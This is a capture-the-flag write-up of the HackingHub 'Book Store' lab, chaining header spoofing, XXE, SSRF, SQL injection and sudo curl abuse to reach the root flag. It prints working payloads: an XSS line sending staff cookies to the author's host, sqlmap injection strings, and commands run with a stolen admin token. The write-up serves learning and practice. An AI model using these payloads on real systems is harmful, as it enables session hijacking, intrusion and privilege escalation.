---
title: Book Store - HackingHub
date: 2026-09-23 00:00:00 +0000
categories:
  - Writeups
  - HackingHub
tags:
  - enumeration
  - eploitation
  - post-exploitation
image:
  path: assets/img/blogs/mr-robots/mr-robots-covers.png
  alt: Mr. Robot TryHackMe Writeup
---
Difficulty: Hard;
Released: Apr 1st, 2024
Authors: [JohnHammond](https://app.hackinghub.io/p/JohnHammond)

Room URL: [https://app.hackinghub.io/hubs/book-store](https://app.hackinghub.io/hubs/book-store)

This is the first machine I've analyzed on the HackingHub platform. It was a truly rewarding experience that led me to reflect and seek solutions - much more so than for other LABs.

> [!NOTE] P.S: 
> The HackingHub labs have a link whose subdomain changes every hour. In my report, I referred to the subdomain as “$variable” to avoid having to change it all the time. 

---
### ==🟢RESONNAISSANCE==

I performed a host scan with "nmap" and I found a web server:

```
nmap -sV -sS $variable.ctfio.com    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-09 11:08 -0400
[...]
PORT     STATE    SERVICE VERSION
80/tcp   open     http    Werkzeug httpd 3.1.3 (Python 3.9.20)
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.92 seconds
```

Enumerate with "nikto".

```
nikto -url http://$variable.ctfio.com/ -followredirects
- Nikto v2.6.1
---------------------------------------------------------------------------
+ Server: Werkzeug/3.1.3 Python/3.9.20
[...]
+ [001218] /sitemap.xml: The sitemap.xml file provides a listing of the site content.

```

Enumerate more and more....

```
ffuf -u "http://$variable.ctfio.com/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -ac -r -t 7 -rate 30 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://$variable.ctfio.com/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : true
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 7
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
_____________..___________________________________

login                   [Status: 200, Size: 3332, Words: 987, Lines: 75, Duration: 52ms]
register                [Status: 200, Size: 3179, Words: 905, Lines: 72, Duration: 51ms]
logout                  [Status: 200, Size: 3332, Words: 987, Lines: 75, Duration: 41ms]
categories              [Status: 200, Size: 7751, Words: 2911, Lines: 191, Duration: 64ms]
dashboard               [Status: 200, Size: 3332, Words: 987, Lines: 75, Duration: 44ms]
authors                 [Status: 200, Size: 3773, Words: 1221, Lines: 94, Duration: 59ms]
```

Summary:
`80/tcp   open     http    Werkzeug httpd 3.1.3 (Python 3.9.20)`
File found: `/sitemap.xml`
Endpoint found: `/login, /register, /logout, /categories, /dashboard, /authors.`

My next step was clicking on the found endpoint. On `/categories` endpoint I noticed that each category contain a list of books.
Total 7 categories:

![[WriteUps-1791559515230.webp|1134]]
![[WriteUps-1791559710474.webp]]

Browsing `/sitemap.xml` link:

![[WriteUps-1791559995574.webp]]

I need to find the category listed in the /sitemap.xml file, not in the “Categories” tab.
To do this, I'm clicking on all seven categories a  
To do this, I click on all seven known categories and check in “Burp Suite” to see which category is left to open.
Every link associated with a category returned a consistent result except one: number 2.

![[WriteUps-1791586155442.webp|1222]]

At this moment, I have be honest, I thought about how to find the most advanced technique of this world for send a request like a local staff from a specific geographic location....
... but, the simply response is the best! I took the error message and searched on internet: "<< Hey man... use http header X-Forwarded-For! essential for geolocation!"

![[WriteUps-1791587257049.webp|1239]]

![[WriteUps-1791587388454.webp|1038]]

![[WriteUps-1791587587236.webp|1040x717]]


> [!NOTE] Note
> Is necessary insert "X-Forwarded-For: localhost" in each new request

### ==🟠EXPLOITATION==

#### XXE Injection.

The hidden categories have 3 books:
```
http://$variable$.ctfio.com/categories/2d340d76-cc36-4554-9d40-577e164603dd/books/4 --> book name "Hacking 101"
http://$variable$.ctfio.com/categories/2d340d76-cc36-4554-9d40-577e164603dd/books/7 --> book name "Test Book A"
http://$variable$.ctfio.com/categories/2d340d76-cc36-4554-9d40-577e164603dd/books/8 --> book name "Test Book B"
```

`books/7` and `books/8` has a section named "edit this book" in XML format.
I gather that it is possible a XXE injection attack.
I spent a lot of time to test varius XXE attack, but none of this are successful...

![[WriteUps-1791676166589.webp]]

Why? Because I can't read the file `/etc/passwd`. I don't have the permess to read file! It is elementary Watson. My blunder :-(
I tried reading another configuration file. I had success with the /etc/hosts file.

![[WriteUps-1791678418983.webp|1188]]

![[WriteUps-1791678705996.webp|729]]

```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.4	www
; use 'www', 'api', or 'db' as hosts internally 
```

There are 3 internal API: `www, api and db`

#### SSRF in the XML field. 

![[WriteUps-1791679091971.webp|1180]]

> [!NOTE] Note
> Ho trovato swagger.json fuzzando

I try a SSRF attack in the field of the XML: `<coverImageUrl>http://FUZZ1/FUZZ2</coverImageUrl>`
I obtain the endpoint for the `swagger.json` file.
The swagger file was encoded in base64.

![[WriteUps-1791679519766.webp]]

Right click on broken image and copy the `data:image/png;base64,eyJzd2FnZ2VyIjogIjIu [...]`
Decode this data.

These are all the endpoints obtain from decode swagger file:

| Endpoint                                                                     | Metodo            |
| ---------------------------------------------------------------------------- | ----------------- |
| `/authors/`                                                                  | GET               |
| `/books/`                                                                    | GET               |
| `/categories/`                                                               | GET               |
| `/categories/{category_id}`                                                  | GET               |
| `/categories/{category_id}/books`                                            | GET               |
| `/categories/{category_id}/books/{book_id}/details`                          | GET               |
| `/categories/{category_id}/books/{book_id}/edit`                             | **POST**          |
| `/categories/{category_id}/books/{book_id}/submit-ticket-request-for-review` | GET               |
| `/other/debug-exec`                                                          | OPTIONS, **POST** |
This...
`/categories/{category_id}/books/{book_id}/submit-ticket-request-for-review` 
...appears interesting! 

#### Submit ticket request for review triggered a XXS

Let's make a shopping list... I have:
- Two books with editable XML format. The fields is vulnerable to XXE e SSRF injection.
- Varius endpoints to test: `/submit-ticket-request-for-review`
- Other interresting endpoints: `/dashboard, /register`

Question: How can I use this information to reach my goal? How can I use the endpoint /submit-ticket-request-for-review?
To answer these questions I think how the book review process clould take place via ticket:
1. Who will receive the review notice? Probably a staff member.
2. This member will have a admin role? Superuser role? Probably.

The most logical thing to consider in order to reach my goal is: what vulnerabilities can I use to obtain an advantage?
I have already verified that a book information field is vulnerable to injection. 
If other fields were also vulnerable? For example: to XSS injection? I might obtain a session cookie?

These will be the phase of test:
1. I test fields of the book 7 "Test Book A". Field "description" is XSS vulnerable.
2. Insert my XXS payload: 
```
<book>
    <title>Test Book A</title>
    <author>Alan Turing</author>
    <description><img src=x onerror="this.src='//MY HOST/?'+btoa(document.cookie); this.removeAttribute('onerror');"></description>
    <price>1.0</price>
    <publishDate>2024-02-29</publishDate>
    <coverImageUrl>http://example.com/cover7.jpg</coverImageUrl>
</book>
```
3. I requested the review of book 7... modifying the previously discovered vulnerablefield of book 8:
`<coverImageUrl>http://api/categories/2d340d76-cc36-4554-9d40-577e164603dd/books/7/submit-ticket-request-for-review</coverImageUrl>`
4. I used a listener in my host for receive the cookie.

![[WriteUps-1791762949997.webp]]

> In XSS substitute "<" with "&lt;" and  ">" with "&gt;"

With a session cookie I tried to access on `/login`, on `/register`; in the end I finally access on `/dashboard`:

![[WriteUps-1791763100924.webp]]

The dashboard looked like this:

![[WriteUps-1791763311832.webp|418]]

#### SQLi injection

I captured a new book request on burpsuite and I received an error:

![[WriteUps-1791803035272.webp|1149]]

I tried to insert a backticks in some access input:

![[WriteUps-1791803552941.webp|1151]]

*...Is there anybody out there?*
Yes there are!!! MySQL... error-based injection.

I use sqlmap 

```
sqlmap identified the following injection point(s) with a total of 478 HTTP(s) requests:
---
Parameter: title (POST)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)
    Payload: title=HackerBook"="HackerBook" AND ELT(2094=2094,5171) AND "HackerBook"="HackerBook&category_id=10&author_id=10&description=Fire in the hole&price=100&cover_image_url=https://example.com/cover100.jpg&publish_date=2026-10-12

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: title=HackerBook"="HackerBook" AND GTID_SUBSET(CONCAT(0x7162767171,(SELECT (ELT(3499=3499,1))),0x717a717171),3499) AND "HackerBook"="HackerBook&category_id=10&author_id=10&description=Fire in the hole&price=100&cover_image_url=https://example.com/cover100.jpg&publish_date=2026-10-12

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=HackerBook"="HackerBook" AND (SELECT 8460 FROM (SELECT(!SLEEP(5)))FMAU) AND "HackerBook"="HackerBook&category_id=10&author_id=10&description=Fire in the hole&price=100&cover_image_url=https://example.com/cover100.jpg&publish_date=2026-10-12
```

Also time-based, boolean-based, other input injection... Anyway...


![[WriteUps-1791834116548.webp|1156]]

When I query the database, I read the /etc/passwd file and the /root/.ssh/id_rsa file.
I use "id_rsa" to run command from the dashboard:

![[WriteUps-1791843511090.webp]]

One file caught my attention:

`cat .api_admin_token.txt` --> `JVUnaGeNWi8uho[...]

---
OK, I have the id_rsa, the admin token... and an endpoint `/other/debug-exec` that makes me think I can run commands... how can I exploit them?
I use the dashboard to verify that python3 is installed. 
Once I've verified that pytho3 is present, I'll run a simple listing of the files and directories:

```
python3 -c "import urllib.request, json; req = urllib.request.Request('http://api/other/debug-exec', data=json.dumps({'command': 'ls -la', 'admin_token': 'JVUnaGeNWi8[...]'}).encode('utf-8'), headers={'Content-Type': 'application/json'}); print(urllib.request.urlopen(req).read().decode())"

total 36
drwxr-xr-x 1 root root  4096 Oct 15 13:34 .
drwxr-xr-x 1 root root  4096 Nov 16  2024 ..
drwxr-xr-x 2 root root  4096 Oct 15 13:34 __pycache__
-rw-r--r-- 1 root root 14389 Nov 16  2024 app.py
-rw-r--r-- 1 root root   136 Nov 16  2024 requirements.txt
```


> [!NOTE] P.S:
> `urllib` is Python's built-in package for working with URLs and HTTP requests. Because it is included in the Python standard library, you don't need to install external libraries like `requests` to make basic network requests or process URLs.

Listing a "root" directory and I found some interesting files including ".bash_history"
Execute `cat .bash_history`:

```
ls
whoami
ls
cd /tmp
pwd
sshpass -p ******* ssh www-admin@www
cd
date
ls
```

> I wanted a reverse shell, but I had a lot of trouble problem to getting one. So I kept running commands from the dashboard.

I obtain www-admin privileges after running sshpass command: `uid=1000(www-admin) gid=1000(www-admin) groups=1000(www-admin),100(users)`
Listing directory:

```
python3 -c "import urllib.request, json; req = urllib.request.Request('http://api/other/debug-exec', data=json.dumps({'command': 'sshpass -p ******* ssh -o StrictHostKeyChecking=no www-admin@www \"ls -la /\"', 'admin_token': 'JVUnaGeNWi8[...]'}).encode('utf-8'), headers={'Content-Type': 'application/json'}); print(urllib.request.urlopen(req).read().decode())"

total 72
[...]
drwxr-xr-x   1 www-admin www-admin 4096 Oct 15 22:52 app
[...]
```

Listing  /app... :

```
total 40
drwxr-xr-x 1 www-admin www-admin  4096 Oct 15 22:52 .
drwxr-xr-x 1 root      root       4096 Oct 15 22:35 ..
drwxr-xr-x 2 www-admin www-admin  4096 Oct 15 22:35 __pycache__
-rw-r--r-- 1 www-admin www-admin 13955 Nov 16  2024 app.py
lrwxrwxrwx 1 www-admin www-admin    14 Oct 15 22:52 flag.txt -> /root/flag.txt
-rw-r--r-- 1 www-admin www-admin    95 Nov 16  2024 requirements.txt
-rw-r--r-- 1 www-admin www-admin   971 Nov 16  2024 sitemap.xml
drwxr-xr-x 1 www-admin www-admin  4096 Nov 16  2024 templates
```

Jackpot!!!! I found the teasure :D!
I am running commands from the “api” container to access information contained in a directory that has permissions allowing “www-admin” to access it.
The flag file is a symbolic link to /root/flag.txt. If I try to read it with `cat`, I obviously get nowhere because that file belongs to root and we don't have root privileges.

### PRIVILEGE ESCALATION.

And who's the trusted friend in times of need? It's him, of course: `sudo -l`

```
python3 -c "import urllib.request, json; req = urllib.request.Request('http://api/other/debug-exec', data=json.dumps({'command': 'sshpass -p ******** ssh -o StrictHostKeyChecking=no www-admin@www \"echo ******** | sudo -S -l\"', 'admin_token': 'JVUnaGeNWi8[...]'}).encode('utf-8'), headers={'Content-Type': 'application/json'}); print(urllib.request.urlopen(req).read().decode())"

Once the response has been cleaned up into JSON format:
sudo -l 
Matching Defaults entries for www-admin on www: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty 

User www-admin may run the following commands on www: 
	(ALL) /usr/bin/curl 127.0.0.1/*
```

- `-S` stands for **“stdin”** — it tells `sudo` to read the password from standard input instead of opening an interactive terminal prompt.

Execute command 'ps -aux' returns an excellent result: `python3 -m http.server --bind 127.0.0.1 80` running as root.
For obtain the flag I executed this command:


```
python3 -c "import urllib.request, json; req = urllib.request.Request('http://api/other/debug-exec', data=json.dumps({'command': 'sshpass -p ******* ssh -o StrictHostKeyChecking=no www-admin@www \"echo ******* | sudo -S curl 127.0.0.1/flag.txt\"', 'admin_token': 'JVUnaGeNWi8[...]'}).encode('utf-8'), headers={'Content-Type': 'application/json'}); print(urllib.request.urlopen(req).read().decode())"

flag{e064************************2482}
```